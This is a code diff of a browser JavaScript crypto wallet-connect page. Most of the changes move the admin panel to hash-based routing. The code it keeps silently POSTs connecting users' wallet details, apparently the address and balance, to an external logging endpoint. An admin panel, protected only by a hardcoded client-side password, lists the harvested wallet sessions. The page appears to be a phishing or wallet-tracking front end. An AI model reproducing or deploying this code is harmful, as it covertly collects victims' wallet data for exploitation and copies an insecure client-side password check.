@@ -21,7 +21,6 @@ const ADMIN_PASSWORD = "ChangeMe123";
 async function connectWallet() {
   loading.style.display = "block";
   connectBtn.disabled = true;
-
   provider = await EthereumProvider.init({
     projectId: "84e8498a4e08cafe1acaf08369fd7a56",
     chains: [1, 56, 137],
@@ -29,16 +28,13 @@ async function connectWallet() {
   });
   await provider.enable();
   ethersProvider = new ethers.BrowserProvider(provider);
-
   const signer = await ethersProvider.getSigner();
   const address = await signer.getAddress();
   const balance = await ethersProvider.getBalance(address);
-
   walletAddress.textContent = address;
   walletBalance.textContent = ethers.formatEther(balance);
   walletDetails.style.display = "block";
   loading.style.display = "none";
-
   fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -49,7 +45,6 @@ async function connectWallet() {
       timestamp: Date.now()
     })
   });
-
   localStorage.setItem("wallet_connected", "1");
 }
 
@@ -65,20 +60,19 @@ disconnectBtn.addEventListener("click", disconnectWallet);
 if (localStorage.getItem("wallet_connected") === "1") connectWallet();
 
 adminBtn.addEventListener("click", () => {
-  walletApp.style.display = "none";
-  adminLogin.style.display = "block";
+  location.hash = "#login";
 });
 
-loginBtn.addEventListener("click", async () => {
+loginBtn.addEventListener("click", () => {
   if (adminPass.value !== ADMIN_PASSWORD) return alert("Wrong password");
+  location.hash = "#admin";
+});
 
-  adminLogin.style.display = "none";
-  adminPanel.style.display = "block";
-
+async function loadSessions() {
+  sessionList.innerHTML = "";
   const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
   const logs = await res.json();
-
-  logs.forEach((entry, idx) => {
+  logs.filter(e => e && e.address).forEach((entry, idx) => {
     const li = document.createElement("li");
     li.className = "list-group-item";
     li.innerHTML = `
@@ -89,4 +83,22 @@ loginBtn.addEventListener("click", async () => {
     `;
     sessionList.appendChild(li);
   });
-});
+}
+
+function handleRoute() {
+  const hash = location.hash;
+  walletApp.style.display = "none";
+  adminLogin.style.display = "none";
+  adminPanel.style.display = "none";
+  if (hash === "#admin") {
+    adminPanel.style.display = "block";
+    loadSessions();
+  } else if (hash === "#login") {
+    adminLogin.style.display = "block";
+  } else {
+    walletApp.style.display = "block";
+  }
+}
+
+window.addEventListener("hashchange", handleRoute);
+window.addEventListener("load", handleRoute);
